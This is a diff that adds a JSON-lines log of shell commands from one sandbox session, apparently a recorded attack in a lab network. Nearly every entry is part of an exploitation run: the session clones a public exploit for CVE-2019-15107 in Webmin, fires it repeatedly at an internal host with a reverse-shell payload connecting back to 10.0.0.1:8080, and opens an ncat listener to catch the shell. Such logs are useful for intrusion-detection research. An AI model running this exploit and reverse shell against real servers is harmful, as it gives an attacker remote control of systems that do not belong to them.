@@ -1,0 +1,20 @@
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:52:42.148851+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py https://172.18.1.5:10000 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:53:14.477935+02:00", "cmd_type": "bash-command", "cmd": "ls"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:53:31.321143+02:00", "cmd_type": "bash-command", "cmd": "ls -la"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:53:37.233140+02:00", "cmd_type": "bash-command", "cmd": "drwx------  3 root root  4096 Apr  7 11:39 .gnupg"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:53:37.292722+02:00", "cmd_type": "bash-command", "cmd": "drwxr-xr-x  3 root root  4096 Jul 15 09:27 .local"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:53:37.322101+02:00", "cmd_type": "bash-command", "cmd": "drwxr-xr-x  2 root root  4096 Jul 15 09:27 Music"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:53:37.357081+02:00", "cmd_type": "bash-command", "cmd": "drwxr-xr-x  2 root root  4096 Jul 15 09:27 Pictures"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:53:57.547130+02:00", "cmd_type": "bash-command", "cmd": "git clone https://github.com/jas502n/CVE-2019-15107"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:54:19.397101+02:00", "cmd_type": "bash-command", "cmd": "cd"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:54:20.961396+02:00", "cmd_type": "bash-command", "cmd": "ls"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:54:27.693412+02:00", "cmd_type": "bash-command", "cmd": "cd CVE-2019-15107/"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:54:28.559825+02:00", "cmd_type": "bash-command", "cmd": "ls"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:54:38.641961+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py https://172.18.1.5:10000 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:54:58.573316+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:55:38.831206+02:00", "cmd_type": "bash-command", "cmd": "ncat -l 8080"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:55:50.384792+02:00", "cmd_type": "bash-command", "cmd": "sudo apt install ncat"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:56:39.620821+02:00", "cmd_type": "bash-command", "cmd": "ncat -l 8080"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:56:55.426243+02:00", "cmd_type": "bash-command", "cmd": "ncat -i 8080"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:57:18.913897+02:00", "cmd_type": "bash-command", "cmd": "ncat -l 8080"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T10:57:25.845770+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'"}
